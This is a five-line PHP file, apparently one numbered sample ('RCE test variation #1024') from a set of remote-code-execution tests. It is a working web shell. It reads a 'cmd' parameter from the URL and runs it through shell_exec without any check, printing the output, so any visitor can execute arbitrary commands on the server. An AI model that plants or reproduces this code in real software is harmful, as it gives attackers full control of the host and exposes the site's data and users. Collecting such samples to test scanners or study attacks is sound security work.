<?php
// RCE test variation #1024
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>